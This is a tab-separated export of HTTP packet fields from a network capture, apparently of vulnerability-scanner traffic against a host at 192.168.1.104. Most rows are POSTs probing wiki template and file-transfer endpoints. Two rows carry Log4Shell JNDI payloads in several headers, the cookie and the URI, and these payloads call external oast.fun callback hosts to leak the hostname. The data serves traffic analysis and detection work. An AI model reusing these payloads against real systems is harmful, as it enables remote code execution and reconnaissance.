http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/wiki/pages/createpage-entervariables.action?SpaceKey=x		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wiki/pages/createpage-entervariables.action?SpaceKey=x
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/wiki/pages/createpage-entervariables.action		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/wiki/pages/createpage-entervariables.action
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/wiki/pages/createpage-entervariables.action		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/wiki/pages/createpage-entervariables.action
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/doenterpagevariables.action		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/pages/doenterpagevariables.action
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/createpage.action?spaceKey=myproj		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/pages/createpage.action?spaceKey=myproj
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/createpage.action?spaceKey=myproj		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/pages/createpage.action?spaceKey=myproj
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/templates2/viewpagetemplate.action		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/pages/templates2/viewpagetemplate.action
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/createpage-entervariables.action		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/pages/createpage-entervariables.action
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/createpage-entervariables.action		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/pages/createpage-entervariables.action
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/template/custom/content-editor		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/template/custom/content-editor
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/template/custom/content-editor		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/template/custom/content-editor
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/templates/editor-preload-container		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/templates/editor-preload-container
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/templates/editor-preload-container		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/templates/editor-preload-container
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/users/user-dark-features		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/users/user-dark-features
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/users/user-dark-features		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/users/user-dark-features
	gzip																close		63	63	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/system/sharedir.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/system/sharedir.php
*/*	gzip	en															close		107	107	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/cgi-bin/file_transfer.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/cgi-bin/file_transfer.cgi
${jndi:ldap://127.0.0.1#.${hostName}.accept.c8acdv19m8v8vih9b0ngcekcxyyyyyybq.oast.fun}	${jndi:ldap://127.0.0.1#.${hostName}.acceptencoding.c8acdv19m8v8vih9b0ngcekcxyyyyyybo.oast.fun}	${jndi:ldap://127.0.0.1#.${hostName}.acceptlanguage.c8acdv19m8v8vih9b0ngcekcxyyyyyyb1.oast.fun}															close										192.168.1.104					${jndi:ldap://127.0.0.1#.${hostName}.location.c8acdv19m8v8vih9b0ngcekcxyyyyyyny.oast.fun}									${jndi:ldap://127.0.0.1#.${hostName}.referer.c8acdv19m8v8vih9b0ngcekcxyyyyyynr.oast.fun}	1	http://192.168.1.104/web/?x=${jndi:ldap://127.0.0.1		GET				HTTP/1.1																			${jndi:ldap://127.0.0.1#.${hostName}.useragent.c8acdv19m8v8vih9b0ngcekcxyyyyyyne.oast.fun}		${jndi:ldap://127.0.0.1#.${hostName}.xforwardedfor.c8acdv19m8v8vih9b0ngcekcxyyyyyyno.oast.fun}	${jndi:ldap://127.0.0.1#.${hostName}.cookiename.c8acdv19m8v8vih9b0ngcekcxyyyyyybh.oast.fun}=${jndi:ldap://${hostName}.cookievalue.c8acdv19m8v8vih9b0ngcekcxyyyyyyb6.oast.fun}	/web/?x=${jndi:ldap://127.0.0.1
${jndi:ldap://${hostName}.accept.c8acdv19m8v8vih9b0ngcekcxyyyyyyyg.oast.fun}	${jndi:ldap://${hostName}.acceptencoding.c8acdv19m8v8vih9b0ngcekcxyyyyyyye.oast.fun}	${jndi:ldap://${hostName}.acceptlanguage.c8acdv19m8v8vih9b0ngcekcxyyyyyyyk.oast.fun}															close										192.168.1.104					${jndi:ldap://${hostName}.location.c8acdv19m8v8vih9b0ngcekcxyyyyyyya.oast.fun}									${jndi:ldap://${hostName}.referer.c8acdv19m8v8vih9b0ngcekcxyyyyyyyh.oast.fun}	1	http://192.168.1.104/web/?x=${jndi:ldap://${hostName}.c8acdv19m8v8vih9b0ngcekcxyyyyyyyr.oast.fun/a}		GET				HTTP/1.1																			${jndi:ldap://${hostName}.useragent.c8acdv19m8v8vih9b0ngcekcxyyyyyyby.oast.fun}		${jndi:ldap://${hostName}.xforwardedfor.c8acdv19m8v8vih9b0ngcekcxyyyyyybe.oast.fun}	${jndi:ldap://${hostName}.cookiename.c8acdv19m8v8vih9b0ngcekcxyyyyyyyw.oast.fun}=${jndi:ldap://${hostName}.cookievalue.c8acdv19m8v8vih9b0ngcekcxyyyyyyys.oast.fun}	/web/?x=${jndi:ldap://${hostName}.c8acdv19m8v8vih9b0ngcekcxyyyyyyyr.oast.fun/a}
	gzip																close		78	78	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/en/php/usb_sync.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/en/php/usb_sync.php
*/*	gzip	en															close		107	107	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/cgi-bin/file_transfer.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/cgi-bin/file_transfer.cgi
